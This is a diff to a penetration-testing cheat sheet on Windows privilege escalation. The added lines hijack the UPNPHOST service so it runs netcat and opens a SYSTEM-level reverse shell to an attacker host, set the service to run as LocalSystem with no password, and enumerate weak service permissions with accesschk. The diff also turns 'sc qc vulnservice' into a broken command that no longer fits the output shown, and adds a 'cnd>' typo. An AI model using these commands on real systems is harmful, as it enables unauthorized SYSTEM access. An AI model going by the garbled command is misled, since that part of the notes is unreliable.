@@ -657,18 +657,38 @@ Enum missing software patches - Sherlock.ps1
 1. Copy local `sherlock.ps1` file to remote.
 2. Run `cmd> powershell -executionpolicy bypass ".\sherlock.ps1"`.
 
+Windows SP0/SP1 UPNPHOST/SSDPSRV privilege escalation
+* See https://sohvaxus.github.io/content/winxp-sp1-privesc.html
+```powershell
+cmd> sc qc upnphost
+cmd> sc config upnphost binpath= "C:\temp\nc.exe [kali] 666 -e cmd.exe" # set binpath to nc payload
+cmd> sc config upnphost obj= ".\LocalSystem" password= ""               # load as system with no pwd
+cnd> sc config upnphost dependencies= ""                                # remove dependnecies (SSDPSRV)
+cmd> net start upnphost                                                 # start service + catch reverse shell
+```
 
 ### Services - Misconfigured Permissions
 
 Enumerate misconfigured service permissions
 * Exploit by replacing binary with malicious reverse shell binary.
+
+Find running services we can write to (weak service permissions)
+```powershell
+# Accesschk (faster)
+cmd> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+cmd> accesschk.exe /accepteula -uwdqs Users c:\
+
+# tasklist (slower)
+cmd> tasklist /svc
 ```
-# enum running services
+
+Exploit
+```
 cmd> tasklist /svc
 vulnservice.exe VulnService
 
 # enum service
-cmd> sc qc vulnservice
+cmd> vulnservice
 [SC] QueryServiceConfig SUCCESS
 SERVICE_NAME: MEmuSVC
         TYPE               : 10  WIN32_OWN_PROCESS 
